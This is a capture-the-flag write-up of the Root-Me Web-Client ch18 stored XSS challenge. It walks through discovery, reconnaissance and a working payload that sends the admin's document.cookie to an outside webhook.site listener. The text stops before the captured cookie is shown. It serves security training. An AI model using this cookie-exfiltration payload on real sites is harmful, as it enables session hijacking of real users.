# Root-Me Web-Client ch18 — Stored XSS: Admin Cookie Exfiltration

## Overview

The target is a minimal forum ("Forum v0.001") that accepts a title and a message and displays posted messages back on the page. This write-up documents the discovery and exploitation of a **stored cross-site scripting (XSS)** vulnerability that allowed exfiltration of an administrator's session cookie.

## Environment

* Kali Linux on Oracle VirtualBox
* Burp Suite (intercepting proxy)
* Target: `http://challenge01.root-me.org/web-client/ch18/`

## Discovery

The application's structure — a post-and-display forum — closely resembled the DVWA stored-XSS exercise, so stored XSS was an early hypothesis.

```html
<script>alert("Hello World")</script>
```

The alert fired when the post rendered, confirming the application **stores and returns input without output encoding**, and that injected scripts execute.

## Establishing the attack goal

With execution confirmed, I tested whether cookie theft was viable by injecting `document.cookie`. It returned blank — my own unauthenticated session had no JS-readable cookie. That reframed the problem: the cookie worth stealing belongs to whoever's browser _executes_ the script, not mine. I still needed to find how a privileged user would ever trigger the payload.

## Ruling out an alternative path

The page displayed a `Status: visitor` label, so I checked in Burp whether privilege was tracked in a client-controllable value. Only `titre` and `message` were sent to the server — no status parameter — indicating the label is server-rendered and not forgeable. This ruled out a privilege-escalation route and confirmed XSS-based exfiltration as the necessary approach.

I also inspected the server's response headers and found **no `Content-Security-Policy`** — meaning inline scripts and outbound requests to external origins are unrestricted, a precondition for exfiltration to succeed.

## Finding the victim

Reviewing the page source, one system-generated post stood out: _"Message read / Your messages have been read."_ A passive forum wouldn't announce that messages had been read — so an automated process (inferred to be an admin) periodically renders the stored posts. That process is the victim context: when it renders my post, my script runs in _its_ browser.

## Exploitation

I stood up a listener on webhook.site and crafted a payload that, on execution, reads the current cookie and sends it out-of-band as a query parameter:

```html
<script>new Image().src='https://webhook.site/<id>/?c='+encodeURIComponent(document.cookie)</script>
```

The image beacon fires a GET the moment its `src` is set, without navigating the page or requiring CORS (the response is never read), and the cookie is URL-encoded to preserve its delimiters. After a few minutes — the admin process's next sweep — the listener received a request carrying the administrator's cookie:
